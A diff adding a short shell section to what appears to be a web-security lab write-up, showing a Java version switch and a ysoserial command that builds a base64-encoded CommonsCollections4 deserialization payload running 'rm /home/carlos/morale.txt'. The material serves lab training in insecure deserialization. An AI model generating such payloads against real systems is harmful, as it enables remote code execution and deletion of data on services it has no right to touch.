@@ -13,4 +13,19 @@
 
 - [ysoserial-all.jar](https://github.com/frohoff/ysoserial)
 
+```shell
+$ sudo apt install openjdk-11-jre-headless
+$ sudo update-alternatives --config java
+There are 2 choices for the alternative java (providing /usr/bin/java).
+
+  Selection    Path                                         Priority   Status
+------------------------------------------------------------
+* 0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      auto mode
+  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
+  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      manual mode
+
+Press <enter> to keep the current choice[*], or type selection number: 1
+$ java -jar /mnt/d/Downloads/ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+```
+
 ## Summary
